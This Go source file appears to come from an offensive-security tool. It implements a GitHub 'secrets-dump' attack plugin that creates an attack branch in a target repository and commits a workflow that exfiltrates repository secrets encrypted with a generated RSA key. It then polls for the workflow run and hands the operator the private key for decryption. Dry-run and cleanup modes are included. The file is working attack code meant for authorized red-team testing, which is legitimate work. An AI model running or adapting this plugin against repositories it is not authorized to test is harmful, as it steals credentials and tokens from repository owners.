package secretsdump

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/crypto"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/github/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("github", "secrets-dump", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements secrets exfiltration via workflow execution
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new secrets dump attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"secrets-dump",
			"Exfiltrate repository secrets via workflow logs",
			"github",
			attacks.CategorySecrets,
		),
	}
}

// CanAttack checks if secrets dump is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Requires injection or pwn_request vulnerability
	return common.FindingHasType(findings, detections.VulnActionsInjection) ||
		common.FindingHasType(findings, detections.VulnPwnRequest)
}

// Execute performs the secrets dump attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Get GitHub client
	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	// Parse owner/repo
	owner, repo, err := common.ParseOwnerRepo(opts.Target)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get default branch
	defaultBranch, err := common.GetDefaultBranch(ctx, client, owner, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	// Get default branch SHA
	branchSHA, err := common.GetBranchSHA(ctx, client, owner, repo, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	branchName := fmt.Sprintf("trajan-attack-%s", opts.SessionID)
	workflowPath := ".github/workflows/trajan-secrets-dump.yml"

	// Generate RSA keypair for encrypted exfiltration
	keyPair, err := crypto.GenerateKeyPair()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to generate keypair: %v", err)
		return result, err
	}

	publicKeyPEM, err := keyPair.PublicKeyPEM()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to encode public key: %v", err)
		return result, err
	}

	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would create encrypted secrets dump workflow"
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  workflowPath,
				Description: "Encrypted secrets dump workflow",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		return result, nil
	}

	// Create attack branch
	_, err = client.CreateBranch(ctx, owner, repo, branchName, branchSHA)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	// Create workflow file with encrypted secrets dump
	workflowContent := common.EncryptedSecretsDumpPayloadBase64(publicKeyPEM, branchName)
	_, err = client.CreateOrUpdateFile(ctx, owner, repo, workflowPath, github.FileContentInput{
		Message: "Add secrets dump workflow",
		Content: workflowContent,
		Branch:  branchName,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create workflow: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  workflowPath,
		Description: "Encrypted secrets dump workflow created",
		URL:         fmt.Sprintf("https://github.com/%s/%s/blob/%s/%s", owner, repo, branchName, workflowPath),
	})

	// The workflow will be triggered automatically by the push to the branch
	// Poll for workflow run with configurable timeout
	timeout := 60 // seconds - configurable default
	var runID int64
	startTime := time.Now()

	for time.Since(startTime) < time.Duration(timeout)*time.Second {
		runs, err := client.GetWorkflowRuns(ctx, owner, repo, 50)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}

		// Find our workflow run by matching head branch
		for _, run := range runs {
			if run.HeadBranch == branchName {
				runID = run.ID
				break
			}
		}

		if runID != 0 {
			break
		}

		time.Sleep(2 * time.Second)
	}

	if runID == 0 {
		result.Success = false
		result.Message = fmt.Sprintf("Workflow not found within %d seconds. Branch %s created but workflow may not have triggered. Check manually.", timeout, branchName)
		result.Data = map[string]interface{}{
			"branch":          branchName,
			"workflow_path":   workflowPath,
			"private_key_pem": keyPair.PrivateKeyPEM(),
			"status":          "INDETERMINATE",
		}
		return result, fmt.Errorf("workflow not found within timeout")
	}

	// Workflow found
	result.Success = true
	result.Message = fmt.Sprintf("Encrypted secrets dump workflow triggered (run ID: %d). Wait for workflow completion, then use 'trajan retrieve --run-id %d' to download and decrypt artifacts.", runID, runID)
	result.Data = map[string]interface{}{
		"branch":          branchName,
		"workflow_path":   workflowPath,
		"run_id":          runID,
		"private_key_pem": keyPair.PrivateKeyPEM(),
	}

	// Add cleanup actions
	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	// Get GitHub platform
	ghPlatform, ok := session.Platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	// Cleanup this plugin's results
	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		// Parse owner/repo from per-result repo (supports org-wide attacks)
		var owner, repo string
		var err error
		if result.Repo != "" {
			owner, repo, err = common.ParseRepoString(result.Repo)
		} else {
			owner, repo, err = common.ParseOwnerRepo(session.Target)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "  Skipping cleanup for %s: %v\n", result.Plugin, err)
			continue
		}

		for _, action := range result.CleanupActions {
			if action.Type == attacks.ArtifactBranch {
				if err := client.DeleteBranch(ctx, owner, repo, action.Identifier); err != nil {
					// If branch doesn't exist (404), that's fine - already cleaned up
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
